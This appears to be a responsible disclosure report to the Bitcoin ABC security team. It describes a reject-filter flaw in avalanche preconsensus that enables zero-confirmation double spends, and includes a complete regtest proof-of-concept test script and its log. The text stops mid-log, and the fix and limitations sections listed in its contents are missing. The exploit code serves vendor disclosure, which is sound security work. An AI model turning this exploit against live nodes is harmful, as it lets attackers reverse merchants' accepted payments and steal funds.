# Responsible disclosure: a stale `m_recent_rejects` filter lets an unprivileged peer force a zero confirmation avalanche double spend

**To:** security@bitcoinabc.org
**Component:** Bitcoin ABC node, avalanche transaction preconsensus and the transaction relay reject filter
**Severity:** High. An unprivileged network peer can reverse a payment the victim already accepted at zero confirmations and finalize the attacker's conflicting spend through preconsensus.
**Reproduced on:** regtest only. Per the disclosure policy I did not run anything against mainnet or testnet.
**Build:** local build of the `master` source tree at commit `28c310db31248991c41559c1cd9e057bcc577594`, pristine node binary (no C++ changes)

---

## Contents

- [1. Impact](#1-impact)
- [2. Root cause](#2-root-cause)
- [3. Why this is a bug, not intended behavior](#3-why-this-is-a-bug-not-intended-behavior)
- [4. How to reproduce (regtest only)](#4-how-to-reproduce-regtest-only)
- [5. Proof of concept: full test source](#5-proof-of-concept-full-test-source)
- [6. Verbatim test output](#6-verbatim-test-output)
- [7. Preconditions and limitations](#7-preconditions-and-limitations)
- [8. Suggested fix](#8-suggested-fix)
- [9. Reporter](#9-reporter)

---

To the Bitcoin ABC security team,

An ordinary peer, with no special permissions and no way to earn a misbehavior penalty, can poison a node's reject filter so the node votes INVALID in avalanche on a transaction that is perfectly valid under the current tip, including one sitting in its own mempool. Chain that across a quorum and an attacker can reverse a zero confirmation payment the victim already accepted and finalize a conflicting double spend through preconsensus. Everything below is reproduced on regtest with a real 16 node avalanche quorum and an unmodified node binary.

## 1. Impact

eCash zero confirmation payments lean on avalanche preconsensus: a merchant, exchange or payment processor treats a transaction as safe within about a second once the quorum finalizes it. An unprivileged peer can make the quorum vote INVALID on a valid payment. That flips the victim's preconsensus decision from accept to reject, evicts the payment it had already taken into its mempool, and lets the attacker's conflicting transaction in instead. Once the attacker hands the conflicting transaction to the quorum, that is the one that finalizes.

All the attacker needs is a normal peer connection. The message that starts the chain carries no misbehavior penalty, so it cannot get them banned. What is at risk is the full value of any zero confirmation payment the attacker picks, and it works again on the next one.

## 2. Root cause

Three separate facts line up. Each one is reasonable on its own; together they break preconsensus for a valid transaction.

**Defect A: the reject filter is documented to reset on a tip change, but the only reset lives on a transaction relay path, so block connection never runs it.**

`m_recent_rejects` is declared at [src/net_processing.cpp#L1314](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L1314), and its own comment states the contract directly: these entries are not rerequested until the chain tip changes, at which point the entire filter is reset ([src/net_processing.cpp#L1295-L1315](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L1295-L1315)). The reset itself is implemented only inside `AlreadyHaveTx` ([src/net_processing.cpp#L3128-L3138](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L3128-L3138)):

```cpp
if (m_chainman.ActiveChain().Tip()->GetBlockHash() !=
    hashRecentRejectsChainTip) {
    // If the chain tip has changed previously rejected transactions
    // might be now valid, e.g. due to a nLockTime'd tx becoming
    // valid, or a double-spend. Reset the rejects filter and give
    // those txs a second chance.
    hashRecentRejectsChainTip =
        m_chainman.ActiveChain().Tip()->GetBlockHash();
    m_recent_rejects.reset();
    m_recent_rejects_package_reconsiderable.reset();
}
```

`AlreadyHaveTx` is only ever reached from transaction relay handling, the `INV` and `TX` message paths. Block connection never calls it. The condition compares the live chain tip against `hashRecentRejectsChainTip`, so the instant a block connects the condition is already true, but the reset does not actually run until the next transaction relay event shows up. If a node gets no such event after a block, the filter is never refreshed, and entries that were only rejected because of the old tip live on across the tip change.

**Defect B: a temporal rejection is inserted into the filter with no misbehavior penalty.**

When a transaction fails validation, `ProcessInvalidTx` records the txid in `m_recent_rejects` ([src/net_processing.cpp#L4285-L4323](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L4285-L4323), insert at line 4315). For a coinbase spent before maturity the reason code is `TX_PREMATURE_SPEND`, which `MaybePunishNodeForTx` treats as "conflicting but not necessarily invalid" and does not penalize ([src/net_processing.cpp#L2763-L2790](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L2763-L2790)). A premature spend turns valid the moment the coinbase matures, but by then its txid is already in the filter, and sending it cost the attacker nothing.

**Defect C: the avalanche vote consults the reject filter before the mempool, so it votes INVALID on a valid transaction.**

`GetAvalancheVoteForTx` checks `m_recent_rejects` and returns 1 (INVALID) before it ever looks at the mempool ([src/net_processing.cpp#L4765-L4808](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L4765-L4808)):

```cpp
LOCK(::cs_main);

// Invalid tx. m_recent_rejects needs cs_main
if (m_recent_rejects.contains(id)) {
    return 1;
}

LOCK(m_mempool.cs);

// Finalized
if (m_mempool.isAvalancheFinalizedPreConsensus(id)) {
    return 0;
}

// Accepted in mempool
if (auto iter = m_mempool.GetIter(id)) {
    ...
```

Because the filter is checked first, a transaction whose txid is in `m_recent_rejects` votes INVALID even when it is currently valid and even when it is in this node's own mempool. For that txid the mempool branch below is never reached.

The same filter means two different things in two places. On the relay path a txid in `m_recent_rejects` means "do not re download this, it was rejected under the current tip", and the reset in `AlreadyHaveTx` keeps that meaning honest. On the avalanche path, in `GetAvalancheVoteForTx`, the same hit means "vote INVALID on this transaction". Those are supposed to be the same statement, "this transaction is invalid under the current state". But the reset that keeps the relay meaning honest only runs on the relay path, never on block connection, so after the tip changes and the coinbase matures the avalanche path still returns INVALID for a transaction that is now valid. Same filter, two consumers, and after one state transition they disagree. That is the bug.

## 3. Why this is a bug, not intended behavior

The comment at [src/net_processing.cpp#L1284-L1291](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L1284-L1291) is explicit that the filter has to be reset when the tip changes, so that transactions rejected only because of the old tip get a fresh chance. In other words, after a block a premature transaction should no longer count as rejected. The code only lives up to that when a transaction relay event happens to arrive after the block. It does not on block connection, and it does not at all on the avalanche vote path, which reads the same filter to make a consensus decision rather than a bandwidth decision.

That reuse is the actual mistake: a best effort bandwidth filter is being used as the first gate of a consensus vote. A bandwidth filter is allowed to be stale. An avalanche vote is not. `TX_PREMATURE_SPEND` carrying no penalty is fine by itself, since an honest peer can relay a premature spend near a block boundary, but put it together with the missing reset and the filter first ordering and it turns into a free, unbannable way to poison the vote.

And the stale window is not narrow in practice. The filter only refreshes on a transaction relay event, and eCash mainnet runs quiet: blocks are often nearly empty and a node can go minutes between relay events. So a poisoned entry can outlast the block that should have cleared it by minutes, while the avalanche poll reading it runs every 10 ms. The quiet conditions help the attacker, not the defender.

## 4. How to reproduce (regtest only)

The test runs a real 16 node avalanche quorum plus one victim node, all real `bitcoind` processes with their own proofs. Nothing is mocked, and the harness never sends a transaction vote. The victim's own avalanche event loop polls the real quorum, and the quorum's poisoned filters produce the INVALID votes on their own.

Run from the repo root against a built tree:

```bash
python3 test/functional/abc_p2p_avalanche_stale_rejects_doublespend_realquorum.py
```

Companion tests that isolate the primitive and a mock quorum variant are also in the tree:

```
test/functional/abc_p2p_avalanche_stale_rejects_vote.py            # single node primitive: node votes INVALID on its own valid mempool tx
test/functional/abc_p2p_avalanche_stale_rejects_doublespend.py     # full kill chain with a mock quorum
```

The test is deterministic because of one structural detail: each quorum node connects to the victim as a block relay only connection, so the victim never announces the merchant payment to the quorum (`fRelay=false` sets `m_relay_txs=false` and the inventory is cleared even under NoBan). The avalanche handshake still runs on that same connection, so the victim polls these peers. So the merchant payment never reaches any quorum node, `AlreadyHaveTx` never runs there, and the poison survives with no timing or mocktime dependence. This containment only covers transaction relay; avalanche proof relay is unconditional (`fRelayProofs = !!m_avalanche`, [src/net_processing.cpp#L2352](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L2352)).

## 5. Proof of concept: full test source

`test/functional/abc_p2p_avalanche_stale_rejects_doublespend_realquorum.py`:

```python
#!/usr/bin/env python3
# Copyright (c) 2026 The Bitcoin developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
"""Regtest PoC: stale m_recent_rejects vote poisoning escalated to a full
0-conf double-spend -- with a FULLY REAL avalanche quorum.

This is the real-quorum upgrade of
abc_p2p_avalanche_stale_rejects_doublespend.py. That test proved the kill
chain with one real victim node whose 16-member quorum was 16 mock Python
P2P interfaces answering scripted INVALID votes. Here the quorum is 16 REAL
bitcoind nodes, each started with its own -avaproof/-avamasterkey, each
genuinely seeded by an unprivileged peer so that it votes INVALID
*organically* through its own C++ code (GetAvalancheVoteForTx,
net_processing.cpp:4782). No mock supplies a single tx vote: the victim's
own avalanche event loop polls the real quorum and the real quorum's
poisoned filters do the rest.

The defect (see abc_p2p_avalanche_stale_rejects_vote.py for the single-node
primitive):
  - m_recent_rejects is documented to reset on chain-tip change
    (net_processing.cpp:1296-1299) but the ONLY reset lives inside
    AlreadyHaveTx (:3128-3138), which is reached exclusively from tx-relay
    code paths (INV/TX handlers). Block connection never resets it.
  - ProcessInvalidTx inserts temporally-rejected txids (e.g.
    TX_PREMATURE_SPEND) with no misbehaviour penalty (:4298-4316, :2776-2789).
  - GetAvalancheVoteForTx checks the filter BEFORE the mempool (:4782 before
    :4798) and returns 1 == INVALID for a tx that is valid under the current
    tip -- even one sitting in the node's own mempool.

Determinism (no race): the stale-tip poison on a quorum node only clears if
AlreadyHaveTx runs there after the tip changed, which only happens on a
tx-relay event (INV/TX). So each quorum node connects TO the victim as a
BLOCK-RELAY-ONLY connection: it sends fRelay=false in its version
(RejectIncomingTxs -> IsBlockOnlyConn, net_processing.cpp:8624), the victim
sets m_relay_txs=false for it and clears M from the send queue
(net_processing.cpp:9027, even under NoBan), so the victim NEVER announces M
to the quorum. The avalanche handshake still runs on that same connection
(m_avalanche->sendHello is unconditional, net_processing.cpp:5173), so the
victim polls these peers. M therefore never reaches any quorum node,
AlreadyHaveTx never runs there, and the poison survives with no timing or
mocktime dependence. (The avalanche event loop itself runs on CScheduler's
std::chrono::steady_clock, processor.cpp:35, independent of any wall clock.)

Quorum establishment: a node only votes definitively (not UNKNOWN) when
isQuorumEstablished() (processor.cpp:838), which requires
peerManager->getNodeCount() >= 8. The 16 quorum nodes are therefore fully
meshed (each sees 15 avalanche peers) and all connect to the victim (which
sees 16). Every quorum node votes from its own poisoned filter.

Evidence that the votes are organic (not scripted), against the pristine,
unmodified bitcoind binary:
  1. Before the victim phase, every quorum node is polled individually by a
     throwaway no-handshake poller and must return a schnorr-signed INVALID
     vote for M under its own getavalanchekey() -- after M became valid.
  2. The victim's only avalanche peers are the 16 real quorum nodes. The
     victim itself holds M in its own mempool, so its own vote for M is
     ACCEPTED; the INVALID votes that flip its record can only come from the
     polled real quorum. Immediately after the reversal (and before D is
     delivered to the quorum), every quorum node is re-polled and must still
     produce a fresh schnorr-signed INVALID vote for M, proving the poison
     was organic and untouched by the reversal.
  3. Control case: an unseeded tx Mc is accepted by the victim, is never
     rejected (the quorum votes UNKNOWN), and finalizes normally once it is
     organically delivered to the quorum. This proves the reversal of M is
     caused by the seeding, not by the harness.

Test PASSES = the real victim, polling the real seeded quorum, evicts the
valid payment M it had itself accepted, admits the double-spend D, and (once
D is delivered to the quorum) finalizes D via preconsensus so the original
payment is permanently displaced -- while the unseeded control tx is
untouched.
"""

import time
from decimal import Decimal

from test_framework.avatools import (
    assert_response,
    gen_proof,
    get_ava_p2p_interface_no_handshake,
    get_proof_ids,
)
from test_framework.blocktools import COINBASE_MATURITY
from test_framework.key import ECPubKey
from test_framework.messages import (
    MSG_TX,
    AvalancheTxVoteError,
    AvalancheVote,
    CTransaction,
    FromHex,
    msg_tx,
)
from test_framework.p2p import P2PDataStore, P2PInterface
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import assert_equal, p2p_port
from test_framework.wallet import MiniWallet, MiniWalletMode
from test_framework.wallet_util import bytes_to_wif

# A node only votes definitively once isQuorumEstablished(), which requires
# getNodeCount() >= 8 among its avalanche peers. With a full mesh each
# quorum node sees QUORUM_NODE_COUNT - 1 peers, so the minimum workable
# quorum is 9. 16 matches the mock-quorum PoC this test upgrades.
QUORUM_NODE_COUNT = 16

AVALANCHE_ARGS = [
    "-avacooldown=0",
    "-avaproofstakeutxoconfirmations=1",
    "-avaproofstakeutxodustthreshold=1000000",
    "-avaminquorumstake=0",
    "-avaminavaproofsnodecount=0",
    # Staking preconsensus (stake contender promotion/polling) is irrelevant
    # to this tx-level PoC; disable it to keep the event loops quiet.
    "-avalanchestakingpreconsensus=0",
]


class AvalancheStaleRejectsDoubleSpendRealQuorumTest(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1 + QUORUM_NODE_COUNT
        # Do NOT whitelist peers (noban_tx_relay). The victim reaches the
        # quorum over block-relay-only connections (see run_test), which
        # structurally prevents it from ever announcing M to them; whitelisting
        # is unnecessary and would only add noise.
        self.noban_tx_relay = False
        # Independent list copies: TestNode.start() appends -bind args to the
        # list it is given, so shared references would corrupt sibling nodes.
        self.extra_args = [list(AVALANCHE_ARGS) for _ in range(self.num_nodes)]

    def run_test(self):
        node = self.nodes[0]
        quorum_nodes = self.nodes[1:]

        # No mocktime freeze: the quorum forms via ordinary (real-time) proof
        # propagation. The attack rests on the real timing asymmetry the
        # finding relies on -- the victim's avalanche poll loop runs every
        # AVALANCHE_TIME_STEP=10 ms (processor.cpp:35) and flips M in well
        # under a second, whereas the victim only trickle-relays M to its
        # inbound quorum peers on the INBOUND_INVENTORY_BROADCAST_INTERVAL=5 s
        # Poisson schedule (net_processing.cpp:256, :8975-8977). The poll wins
        # the race, so the quorum is still poisoned when it answers.
        wallet = MiniWallet(node, mode=MiniWalletMode.RAW_P2PK)
        self.generate(wallet, 8, sync_fun=self.no_op)
        self.generate(node, COINBASE_MATURITY, sync_fun=self.no_op)
        self.sync_blocks(timeout=300)

        self.log.info(
            f"STEP 0: bootstrap {QUORUM_NODE_COUNT} real quorum nodes, each "
            "with its own avalanche proof"
        )
        proof_keys = [gen_proof(self, node) for _ in quorum_nodes]
        self.sync_blocks(timeout=300)

        for i, q in enumerate(quorum_nodes):
            privkey, proof = proof_keys[i]
            self.restart_node(
                i + 1,
                extra_args=AVALANCHE_ARGS
                + [
                    f"-avaproof={proof.serialize().hex()}",
                    f"-avamasterkey={bytes_to_wif(privkey.get_bytes())}",
                ],
            )

        # canShareLocalProof() latches only once a node has an inbound
        # connection (processor.cpp:924-936); give each quorum node one so it
        # advertises its proof in avahello on the mesh connections below.
        for q in quorum_nodes:
            q.add_p2p_connection(P2PInterface())

        # Full mesh among the quorum nodes (each pair connected once) so each
        # reaches isQuorumEstablished() and gossips proofs. Then connect every
        # quorum node TO the victim as a BLOCK-RELAY-ONLY connection. A
        # block-relay-only peer sends fRelay=false in its version
        # (RejectIncomingTxs -> IsBlockOnlyConn, net_processing.cpp:8624), so
        # the victim sets m_relay_txs=false for it and NEVER announces M to it
        # (the inventory is cleared at net_processing.cpp:9027, even under
        # NoBan). The avalanche handshake still runs on the same connection
        # (m_avalanche->sendHello is unconditional, net_processing.cpp:5173),
        # so the victim polls these peers. This structurally guarantees M is
        # never relayed to the quorum -> AlreadyHaveTx never runs there -> the
        # stale-tip poison survives, with no timing/mocktime dependence.
        victim_addr = f"127.0.0.1:{p2p_port(0)}"
        for i in range(1, self.num_nodes):
            for j in range(1, i):
                self.connect_nodes(i, j)
            self.nodes[i].addconnection(victim_addr, "block-relay-only")

        # The functional requirement is that every node is quorum-established
        # (ready_to_poll), which per isQuorumEstablished() requires >= 8 bound
        # avalanche nodes and enough connected stake score.
        for n in self.nodes:
            self.wait_until(
                lambda n=n: n.getavalancheinfo()["ready_to_poll"],
                timeout=300,
                check_interval=0.5,
            )
        # A quorum node's own local proof is only registered in its peer
        # manager (creating a peer entry, i.e. "verified") when
        # updatedBlockTip runs after canShareLocalProof() has latched
        # (processor.cpp:1170-1178, peermanager.cpp:413-424). Connect one
        # more block on every node so each quorum node registers its own
        # proof locally before we verify full proof knowledge below.
        self.generate(wallet, 1, sync_fun=self.no_op)
        self.sync_blocks(timeout=300)

        # Then verify the full proof set is known everywhere. Note that
        # getavalanchepeerinfo only lists *peer* proofs: a quorum node's own
        # local proof is part of its peer list only after the registration
        # above, so for those nodes the local proof is additionally checked
        # through getavalancheinfo's "local" section (and must be verified).
        expected_proofids = {proof.proofid for _, proof in proof_keys}

        proof_sync_log_state = {}

        def node_knows_all_proofs(n, own_proofid=None, label=""):
            known = set(get_proof_ids(n))
            local_verified = None
            if own_proofid is not None:
                local = n.getavalancheinfo().get("local", {})
                local_verified = local.get("verified", False)
                if not local_verified:
                    return False
                known.add(int(local["proofid"], 16))
            missing = expected_proofids - known
            if missing:
                now_t = time.time()
                if now_t - proof_sync_log_state.get(label, 0) > 20:
                    proof_sync_log_state[label] = now_t
                    self.log.info(
                        f"    waiting on {label}: knows {len(known)}/"
                        f"{len(expected_proofids)} proofs, "
                        f"local_verified={local_verified}, missing="
                        f"{[f'{m:064x}'[:16] for m in missing]}"
                    )
                return False
            return True

        for idx, n in enumerate(self.nodes):
            own_proofid = proof_keys[idx - 1][1].proofid if idx >= 1 else None
            self.wait_until(
                lambda n=n, own=own_proofid, lbl=f"node{idx}":
                    node_knows_all_proofs(n, own, lbl),
                timeout=180,
                check_interval=0.5,
            )
        self.log.info(
            "  -> all 17 nodes know all 16 proofs and are ready_to_poll; "
            "each quorum node is quorum-established through the mesh"
        )

        self.log.info(
            "STEP 1: attacker prepares payment M and double-spend D, both "
            "spending a coinbase that matures in exactly one more block"
        )
        self.generate(wallet, 1, sync_fun=self.no_op)
        coinbase_height = node.getblockcount()
        immature = max(
            wallet.get_utxos(include_immature_coinbase=True, mark_as_spent=False),
            key=lambda u: u["height"],
        )
        assert_equal(immature["height"], coinbase_height)
        assert_equal(immature["coinbase"], True)

        self.generate(node, COINBASE_MATURITY - 2, sync_fun=self.no_op)
        assert_equal(node.getblockcount(), coinbase_height + 98)
        self.sync_blocks(timeout=300)

        merchant_tx = wallet.create_self_transfer(
            utxo_to_spend=immature, fee_rate=Decimal("2000")
        )
        doublespend_tx = wallet.create_self_transfer(
            utxo_to_spend=immature, fee_rate=Decimal("3000")
        )
        merchant_txid = merchant_tx["txid"]
        doublespend_txid = doublespend_tx["txid"]
        merchant_txid_int = merchant_tx["tx"].txid_int
        assert merchant_txid != doublespend_txid

        def from_wallet_tx(tx):
            return FromHex(CTransaction(), tx["hex"])

        self.log.info(
            "STEP 2: SEED -- an unprivileged peer sends M to every real "
            "quorum node while M is premature; each rejects it "
            "bad-txns-premature-spend-of-coinbase and inserts txid(M) into "
            "its own m_recent_rejects, with no misbehaviour penalty"
        )
        attacker_peers = [q.add_p2p_connection(P2PDataStore()) for q in quorum_nodes]
        for i, q in enumerate(quorum_nodes):
            attacker_peers[i].send_txs_and_test(
                [from_wallet_tx(merchant_tx)],
                q,
                success=False,
                reject_reason="bad-txns-premature-spend-of-coinbase",
            )
        self.log.info(
            f"  -> all {QUORUM_NODE_COUNT} real quorum nodes seeded"
        )

        self.log.info(
            "STEP 3: the maturing block lands on every node. Block connection "
            "does NOT reset m_recent_rejects (the bug): the only reset lives "
            "in AlreadyHaveTx, and the block-relay-only links guarantee no "
            "tx-relay event ever reaches the quorum to trigger it."
        )
        self.generate(node, 1, sync_fun=self.no_op)
        assert_equal(node.getblockcount(), coinbase_height + 99)
        self.sync_blocks(timeout=300)
        for n in self.nodes:
            n.syncwithvalidationinterfacequeue()

        self.log.info(
            "STEP 4: PROOF OF ORGANIC POISON -- every real quorum node is "
            "polled individually and must return a signed INVALID vote for M "
            "although M is now valid under the current tip"
        )
        verifiers = [
            get_ava_p2p_interface_no_handshake(q) for q in quorum_nodes
        ]
        for i, q in enumerate(quorum_nodes):
            avakey = ECPubKey()
            avakey.set(bytes.fromhex(q.getavalanchekey()))
            verifiers[i].send_poll([merchant_txid_int], MSG_TX)
            assert_response(
                verifiers[i],
                avakey,
                [AvalancheVote(AvalancheTxVoteError.INVALID, merchant_txid_int)],
            )
        self.log.info(
            f"  -> all {QUORUM_NODE_COUNT} real quorum nodes vote INVALID on "
            "the now-valid M, each signature verified against the node's own "
            "getavalanchekey()"
        )

        # From here on the ONLY poller asking the quorum about M is the victim
        # itself: the throwaway verifiers above go idle, M never enters any
        # quorum node's mempool, and the block-relay-only links stop the victim
        # from announcing M to them, so the quorum nodes never poll each other
        # about M. Any INVALID vote the victim now harvests for M is an organic
        # answer from a real node.

        self.log.info(
            "STEP 5: VICTIM -- the merchant's node accepts M into its real "
            "mempool; the attacker immediately sends the double-spend D"
        )
        attacker_v = node.add_p2p_connection(P2PDataStore())
        accepted_txid = node.sendrawtransaction(merchant_tx["hex"])
        assert_equal(accepted_txid, merchant_txid)
        assert merchant_txid in node.getrawmempool()

        # Race-tolerant delivery of D: the real quorum's first no-round can
        # evict M within milliseconds of acceptance, so D may either park in
        # the conflicting pool (M still present) or be accepted directly (M
        # already evicted). Both paths are the same double-spend; assert the
        # converged state below.
        attacker_v.send_without_ping(msg_tx(from_wallet_tx(doublespend_tx)))
        attacker_v.sync_with_ping()
        d_pool = node.gettransactionstatus(doublespend_txid)["pool"]
        if d_pool == "conflicting":
            self.log.info(
                "  -> D parked in the victim's conflicting pool "
                "(txn-mempool-conflict); the rejection handler will pull it in"
            )
        else:
            assert_equal(d_pool, "mempool")
            self.log.info(
                "  -> M was already evicted when D arrived; D accepted "
                "directly into the victim's mempool"
            )

        self.log.info(
            "STEP 6: the REAL victim polls the REAL quorum. Every quorum node "
            "answers INVALID organically from its own poisoned filter "
            "(net_processing.cpp:4782). One no-round (>6 of 8 considered "
            "votes, voterecord.cpp:41-47) flips M to VoteStatus::Rejected -> "
            "net_processing.cpp:7213-7277 evicts M and admits D"
        )
        self.wait_until(
            lambda: merchant_txid not in node.getrawmempool(), timeout=300
        )
        assert_equal(
            node.gettransactionstatus(merchant_txid)["pool"], "conflicting"
        )
        self.log.info("  -> M evicted from the victim mempool (Rejected)")

        # THE DOUBLE-SPEND IS ADMITTED: D took M's place in the mempool,
        # either pulled from the conflicting pool by the rejection handler
        # itself (net_processing.cpp:7252) or accepted directly after the
        # eviction.
        self.wait_until(
            lambda: node.gettransactionstatus(doublespend_txid)["pool"]
            == "mempool",
            timeout=300,
        )
        assert doublespend_txid in node.getrawmempool()
        self.log.info("  -> DOUBLE-SPEND ADMITTED: D is in the victim mempool")

        self.log.info(
            "STEP 7: ORGANIC-VOTE EVIDENCE (captured BEFORE D reaches the "
            "quorum) -- re-poll every real quorum node individually and "
            "require a fresh schnorr-signed INVALID vote for M, verified "
            "against that node's own getavalanchekey(). The victim never "
            "announced M to the quorum (block-relay-only), and D has not yet "
            "been delivered, so the stale-tip poison is untouched: the INVALID "
            "votes that just flipped the victim were genuinely organic."
        )
        for i, q in enumerate(quorum_nodes):
            avakey = ECPubKey()
            avakey.set(bytes.fromhex(q.getavalanchekey()))
            verifiers[i].send_poll([merchant_txid_int], MSG_TX)
            assert_response(
                verifiers[i],
                avakey,
                [AvalancheVote(AvalancheTxVoteError.INVALID, merchant_txid_int)],
            )
        self.log.info(
            f"  -> all {QUORUM_NODE_COUNT} real quorum nodes still sign "
            "INVALID for the valid payment M"
        )

        self.log.info(
            "STEP 8: deliver D to the quorum over RPC so each holds D in its "
            "own mempool and votes ACCEPTED for it. This is the first tx to "
            "propagate among the quorum after the maturing block, so their "
            "stale-tip filters may now reset via AlreadyHaveTx -- harmless, "
            "the M reversal and its per-node evidence are already recorded."
        )
        for q in quorum_nodes:
            assert_equal(q.sendrawtransaction(doublespend_tx["hex"]), doublespend_txid)

        self.log.info(
            "STEP 9: the real quorum (voting ACCEPTED for D) finalizes the "
            "double-spend via preconsensus on the victim"
        )
        self.wait_until(
            lambda: node.isfinaltransaction(doublespend_txid), timeout=600
        )
        assert doublespend_txid in node.getrawmempool()
        assert node.isfinaltransaction(doublespend_txid)
        assert merchant_txid not in node.getrawmempool()
        self.log.info(
            "  -> D is avalanche-finalized on the victim; the valid payment M "
            "the victim originally accepted is permanently displaced"
        )

        self.log.info(
            "STEP 10: CONTROL -- an identical but UNSEEDED payment Mc must "
            "survive: the quorum votes UNKNOWN (not considered), so Mc is "
            "never rejected; once organically delivered to the quorum it "
            "finalizes normally. This proves the reversal of M was caused by "
            "the seeding, not by the harness."
        )
        control_tx = wallet.create_self_transfer(fee_rate=Decimal("2000"))
        control_txid = control_tx["txid"]
        assert_equal(node.sendrawtransaction(control_tx["hex"]), control_txid)
        assert control_txid in node.getrawmempool()

        deadline = time.time() + 10
        while time.time() < deadline:
            assert control_txid in node.getrawmempool()
            assert_equal(
                node.gettransactionstatus(control_txid)["pool"], "mempool"
            )
            time.sleep(0.5)
        assert not node.isfinaltransaction(control_txid)
        self.log.info(
            "  -> control tx survived 10s of polling unflipped (M flipped in "
            "seconds) and is not finalized: no seeding, no rejection"
        )

        for i, q in enumerate(quorum_nodes):
            attacker_peers[i].send_txs_and_test(
                [from_wallet_tx(control_tx)], q, success=True
            )
        self.wait_until(lambda: node.isfinaltransaction(control_txid), timeout=600)
        self.log.info(
            "  -> control tx finalized normally after organic delivery to "
            "the quorum"
        )

        self.log.info(
            "RESULT: with a fully real 16-node quorum, an unprivileged peer "
            "seeded txid(M) into every quorum member's m_recent_rejects via a "
            "temporal rejection; the documented chain-tip reset never ran; "
            "the real victim's own polls harvested organic INVALID votes that "
            "evicted the valid payment it had accepted, admitted the "
            "double-spend D, and finalized D via preconsensus. The unseeded "
            "control payment was never rejected and finalized normally. Amount "
            "at risk = full value of any targeted 0-conf payment."
        )


if __name__ == "__main__":
    AvalancheStaleRejectsDoubleSpendRealQuorumTest().main()
```

## 6. Verbatim test output

Captured from a fresh run against the pristine node binary at commit `28c310d`:

```
2026-08-19T16:58:51.843000Z TestFramework (INFO): Initializing test directory /var/folders/pn/lzm1slcd5212fnnkz_p8hb2c0000gn/T/bitcoin_func_test_2lbvhu2r
2026-08-19T16:58:55.706000Z TestFramework (INFO): STEP 0: bootstrap 16 real quorum nodes, each with its own avalanche proof
2026-08-19T16:59:11.353000Z TestFramework (INFO):     waiting on node0: knows 13/16 proofs, local_verified=None, missing=['7964bc39caf223bd', 'ef16860482fe8b41', '1fe3b8231312e1e0']
2026-08-19T16:59:13.389000Z TestFramework (INFO):   -> all 17 nodes know all 16 proofs and are ready_to_poll; each quorum node is quorum-established through the mesh
2026-08-19T16:59:13.389000Z TestFramework (INFO): STEP 1: attacker prepares payment M and double-spend D, both spending a coinbase that matures in exactly one more block
2026-08-19T16:59:16.674000Z TestFramework (INFO): STEP 2: SEED -- an unprivileged peer sends M to every real quorum node while M is premature; each rejects it bad-txns-premature-spend-of-coinbase and inserts txid(M) into its own m_recent_rejects, with no misbehaviour penalty
2026-08-19T16:59:19.323000Z TestFramework (INFO):   -> all 16 real quorum nodes seeded
2026-08-19T16:59:19.324000Z TestFramework (INFO): STEP 3: the maturing block lands on every node. Block connection does NOT reset m_recent_rejects (the bug): the only reset lives in AlreadyHaveTx, and the block-relay-only links guarantee no tx-relay event ever reaches the quorum to trigger it.
2026-08-19T16:59:19.354000Z TestFramework (INFO): STEP 4: PROOF OF ORGANIC POISON -- every real quorum node is polled individually and must return a signed INVALID vote for M although M is now valid under the current tip
2026-08-19T16:59:22.059000Z TestFramework (INFO):   -> all 16 real quorum nodes vote INVALID on the now-valid M, each signature verified against the node's own getavalanchekey()
2026-08-19T16:59:22.059000Z TestFramework (INFO): STEP 5: VICTIM -- the merchant's node accepts M into its real mempool; the attacker immediately sends the double-spend D
2026-08-19T16:59:22.223000Z TestFramework (INFO):   -> D parked in the victim's conflicting pool (txn-mempool-conflict); the rejection handler will pull it in
2026-08-19T16:59:22.223000Z TestFramework (INFO): STEP 6: the REAL victim polls the REAL quorum. Every quorum node answers INVALID organically from its own poisoned filter (net_processing.cpp:4782). One no-round (>6 of 8 considered votes, voterecord.cpp:41-47) flips M to VoteStatus::Rejected -> net_processing.cpp:7213-7277 evicts M and admits D
2026-08-19T16:59:22.278000Z TestFramework (INFO):   -> M evicted from the victim mempool (Rejected)
2026-08-19T16:59:22.278000Z TestFramework (INFO):   -> DOUBLE-SPEND ADMITTED: D is in the victim mempool
2026-08-19T16:59:22.278000Z TestFramework (INFO): STEP 7: ORGANIC-VOTE EVIDENCE (captured BEFORE D reaches the quorum) -- re-poll every real quorum node individually and require a fresh schnorr-signed INVALID vote for M, verified against that node's own getavalanchekey(). The victim never announced M to the quorum (block-relay-only), and D has not yet been delivered, so the stale-tip poison is untouched: the INVALID votes that just flipped the victim were genuinely organic.
2026-08-19T16:59:23.206000Z TestFramework (INFO):   -> all 16 real quorum nodes still sign INVALID for the valid payment M
2026-08-19T16:59:23.207000Z TestFramework (INFO): STEP 8: deliver D to the quorum over RPC so each holds D in its own mempool and votes ACCEPTED for it. This is the first tx to propagate among the quorum after the maturing block, so their stale-tip filters may now reset via AlreadyHaveTx -- harmless, the M reversal and its per-node evidence are already recorded.
2026-08-19T16:59:23.224000Z TestFramework (INFO): STEP 9: the real quorum (voting ACCEPTED for D) finalizes the double-spend via preconsensus on the victim
2026-08-19T16:59:26.171000Z TestFramework (INFO):   -> D is avalanche-finalized on the victim; the valid payment M the victim originally accepted is permanently displaced
2026-08-19T16:59:26.171000Z TestFramework (INFO): STEP 10: CONTROL -- an identical but UNSEEDED payment Mc must survive: the quorum votes UNKNOWN (not considered), so Mc is never rejected; once organically delivered to the quorum it finalizes normally. This proves the reversal of M was caused by the seeding, not by the harness.
